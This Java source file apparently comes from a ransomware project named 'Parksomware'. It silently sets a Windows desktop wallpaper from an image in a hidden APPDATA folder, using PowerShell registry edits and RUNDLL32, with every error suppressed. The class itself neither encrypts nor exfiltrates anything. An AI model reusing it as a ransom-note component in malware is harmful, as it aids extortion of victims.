package kr.pah;

import java.nio.file.*;

public class WallpaperChanger {

    private static final String PARKSOMWARE_DIR = System.getenv("APPDATA") + "\\Parksomware";
    private static final String BACKGROUND_IMAGE = "background.png";

    public static void main() {
        try {
            Path parksomwarePath = Paths.get(PARKSOMWARE_DIR);
            if (!Files.exists(parksomwarePath)) {
                Files.createDirectories(parksomwarePath);
            }

            Path backgroundPath = parksomwarePath.resolve(BACKGROUND_IMAGE);
            waitForFileExistence(backgroundPath);

            if (Files.exists(backgroundPath)) {
                setDesktopBackground(backgroundPath.toString());
            }
        } catch (Exception ignored) {
        }
    }

    private static void waitForFileExistence(Path filePath) throws InterruptedException {
        int attempts = 0;
        while (!Files.exists(filePath) && attempts < 10) {
            Thread.sleep(500);
            attempts++;
        }
    }

    public static void setDesktopBackground(String imagePath) {
        String command = "powershell.exe Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop' -name WallPaper -value '" + imagePath + "'";

        ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", command);
        processBuilder.redirectErrorStream(true);
        try {
            Process process = processBuilder.start();

            int exitCode = process.waitFor();
            if (exitCode == 0) {
                applyChanges();
            }
        } catch (Exception ignored) {
        }
    }

    private static void applyChanges() {
        ProcessBuilder processBuilder = new ProcessBuilder("RUNDLL32.EXE", "user32.dll,UpdatePerUserSystemParameters");
        processBuilder.redirectErrorStream(true);
        try {
            Process process = processBuilder.start();
            process.waitFor();
        } catch (Exception ignored) {
        }
    }
}
